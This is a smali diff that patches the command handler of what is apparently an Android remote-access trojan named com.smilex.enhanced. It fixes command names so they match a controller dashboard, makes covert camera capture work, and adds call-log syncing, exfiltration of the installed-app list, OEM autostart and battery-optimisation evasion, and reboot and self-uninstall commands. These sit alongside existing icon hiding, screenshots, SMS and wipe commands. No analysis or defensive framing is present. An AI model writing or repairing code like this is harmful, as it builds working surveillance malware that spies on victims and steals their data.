@@ -101,7 +101,8 @@
     invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
     const-string v2, "{\"device_id\":\""
     invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    invoke-static {p0}, Lcom/smilex/enhanced/utils/CryptoUtils;->generateDeviceId()Ljava/lang/String;
+    # FIX: generateDeviceId takes Context; p0 is the Service which extends Context
+    invoke-static {p0}, Lcom/smilex/enhanced/utils/CryptoUtils;->generateDeviceId(Landroid/content/Context;)Ljava/lang/String;
     move-result-object v2
     invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
     const-string v2, "\",\"model\":\""
@@ -295,7 +296,8 @@
 
     # --- SCREENSHOT ---
     :cmd_screenshot
-    const-string v3, "take_screenshot"
+    # FIX: Dashboard sends "screenshot" not "take_screenshot"
+    const-string v3, "screenshot"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
     if-eqz v3, :cmd_sms
@@ -323,9 +325,8 @@
     move-result v3
     if-eqz v3, :cmd_livestream
 
-    const-string v3, "camera"
-    const-string v4, "capture_requested"
-    invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
+    # FIX: Actually call CameraModule.capturePhoto() instead of stub message
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/CameraModule;->capturePhoto(Landroid/content/Context;)V
     goto :end
 
     # --- LIVE STREAM ---
@@ -387,7 +388,8 @@
 
     # --- DEVICE INFO ---
     :cmd_device_info
-    const-string v3, "get_device_info"
+    # FIX: Dashboard sends "device_info" not "get_device_info"
+    const-string v3, "device_info"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
     if-eqz v3, :cmd_files
@@ -507,7 +509,7 @@
     const-string v3, "hide_icon"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
-    if-eqz v3, :cmd_wipe
+    if-eqz v3, :cmd_sync_call_logs
 
     invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
     move-result-object v3
@@ -518,6 +520,90 @@
     invoke-virtual {v3, v4, v5}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
     goto :end
 
+    # --- SYNC CALL LOGS ---
+    :cmd_sync_call_logs
+    const-string v3, "sync_call_logs"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_sync_apps
+
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/CallModule;->init(Landroid/content/Context;)V
+    goto :end
+
+    # --- SYNC INSTALLED APPS ---
+    :cmd_sync_apps
+    const-string v3, "sync_apps"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_bypass_autostart
+
+    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
+    move-result-object v3
+    const/4 v4, 0x0
+    invoke-virtual {v3, v4}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;
+    move-result-object v3
+    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;
+    move-result-object v3
+    const-string v4, "app_usage"
+    invoke-static {v4, v3}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
+    goto :end
+
+    # --- BYPASS OEM AUTOSTART ---
+    :cmd_bypass_autostart
+    const-string v3, "bypass_autostart"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_disable_battery
+
+    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->applyAllOEMBypasses(Landroid/content/Context;)V
+    goto :end
+
+    # --- DISABLE BATTERY OPTIMIZATION ---
+    :cmd_disable_battery
+    const-string v3, "disable_battery_optimization"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_reboot
+
+    # FIX: Correct method name is requestBatteryOptimizationIgnore
+    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->requestBatteryOptimizationIgnore(Landroid/content/Context;)V
+    goto :end
+
+        # --- REBOOT ---
+    :cmd_reboot
+    const-string v3, "reboot"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_uninstall
+    # Requires REBOOT permission (android.permission.REBOOT) — only works on rooted/system apps
+    const-string v3, "power"
+    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    move-result-object v3
+    check-cast v3, Landroid/os/PowerManager;
+    if-eqz v3, :end
+    const/4 v4, 0x0
+    invoke-virtual {v3, v4}, Landroid/os/PowerManager;->reboot(Ljava/lang/String;)V
+    goto :end
+
+    # --- UNINSTALL SELF ---
+    :cmd_uninstall
+    const-string v3, "uninstall"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_wipe
+
+    new-instance v3, Landroid/content/Intent;
+    const-string v4, "android.intent.action.DELETE"
+    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+    const-string v4, "package:com.smilex.enhanced"
+    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+    move-result-object v4
+    invoke-virtual {v3, v4}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
+    const/4 v4, 0x10000000
+    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+    invoke-virtual {p0, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+    goto :end
+
     # --- WIPE DATA ---
     :cmd_wipe
     const-string v3, "wipe_device"
@@ -525,8 +611,10 @@
     move-result v3
     if-eqz v3, :cmd_stop
 
+    # FIX: Kill own process using myPid() result — v1 was a String, not a PID
     invoke-static {}, Landroid/os/Process;->myPid()I
-    invoke-static {v1}, Landroid/os/Process;->killProcess(I)V
+    move-result v3
+    invoke-static {v3}, Landroid/os/Process;->killProcess(I)V
 
     :cmd_stop
     const-string v3, "stop_all"
